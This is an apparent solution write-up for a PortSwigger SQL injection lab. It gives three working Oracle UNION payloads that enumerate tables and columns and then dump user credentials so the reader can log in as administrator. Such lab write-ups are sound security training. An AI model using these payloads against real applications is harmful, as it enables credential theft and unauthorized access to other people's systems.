### Description

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

### Solution

1. Navigate to the URL with the category filter
2. Use the SQLi payload `' UNION SELECT table_name, NULL from all_tables -- -` to list all table names. The table named `USERS_DLZTQM` looks promising.
3. Use the SQLi payload `' UNION SELECT COLUMN_NAME, NULL from all_tab_columns WHERE table_name = 'USERS_DLZTQM' -- -` to list all columns in the user table.
4. Use the SQLi payload `' UNION SELECT USERNAME_FFUXPQ, PASSWORD_QJJNPX from USERS_DLZTQM -- -` to list all user credentials
5. Login using the administrator credentials that were just revealed.

#### Notes

This is pretty much the same as the last lab, but with Oracle syntax
